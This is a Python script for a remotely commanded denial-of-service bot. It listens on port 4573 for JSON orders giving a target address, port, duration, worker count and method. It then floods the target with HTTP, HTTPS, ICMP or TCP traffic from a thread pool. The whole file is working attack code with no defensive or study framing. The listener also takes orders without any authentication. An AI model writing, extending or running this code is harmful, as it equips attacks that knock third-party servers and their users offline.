from concurrent.futures import ThreadPoolExecutor
import json
import os
import requests
import random
import socket
import struct
import threading
import time

i = 0

def ddos(address, port, method):
    global i
    if method == "HTTP":
        try:
            requests.get(f"http://{address}:{port}", data=bytes([0x2F]), timeout=2)
        except:
            pass
    elif method == "HTTPS":
        try:
            requests.get(f"https://{address}:{port}", data=bytes([0x2F]), timeout=2)
        except:
            pass
    elif method == "ICMP":
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            packet = struct.pack("!BBHHH", 8, 0, 0, random.randint(0, 6550), 1)
            checksum = 0
            for x in range(0, len(packet), 2):
                checksum += (packet[x] << 8) + packet[x+1]
            checksum = (checksum >> 16) + (checksum & 0xffff)
            checksum = ~checksum & 0xffff
            packet = struct.pack("!BBHHH", 8, 0, checksum, random.randint(0, 65535), 1)
            n = 0
            while n < 3:
                sock.sendto(packet + os.urandom(1024), (address, 0))
                n += 1
        finally:
            sock.close()
    elif method == "TCP":
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((address, port))
            n = 0
            while n < 100:
                sock.send(os.urandom(1024))
                n += 1
        finally:
            sock.close()
    i += 1
def handle_client(client_socket, address):
    global i
    try:
        data = client_socket.recv(1024).decode('utf-8')
        print(f"Received from {address}: {data}")
        try:
            json_data = json.loads(data)
            print(f"Parsed JSON: {json_data}")
        except json.JSONDecodeError:
            client_socket.send(b"Invalid JSON")
        start_time = time.time()
        json_data['time'] = int(json_data['time'])
        with ThreadPoolExecutor(max_workers=int(json_data['workers'])) as executor:
            print("Start")
            while time.time() < (start_time + json_data['time'] + 1):
                executor.submit(ddos, json_data['address'], json_data['port'], json_data['method'])
                time.sleep(0.01)
            print(f"End, total requests: {i}")
        i = 0
    except Exception as e:
        print(f"Error handling client {address}: {e}")
    finally:
        client_socket.close()

def run_server(port=4573):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('0.0.0.0', port))
    server_socket.listen(5)
    print(f"Starting socket server on port {port}")

    try:
        while True:
            client_socket, address = server_socket.accept()
            print(f"New connection from {address}")
            client_thread = threading.Thread(target=handle_client, args=(client_socket, address))
            client_thread.daemon = True
            client_thread.start()
    except KeyboardInterrupt:
        print("Shutting down server")
        server_socket.close()

server_thread = threading.Thread(target=run_server, args=(4573,))
server_thread.daemon = True
server_thread.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("Server stopped")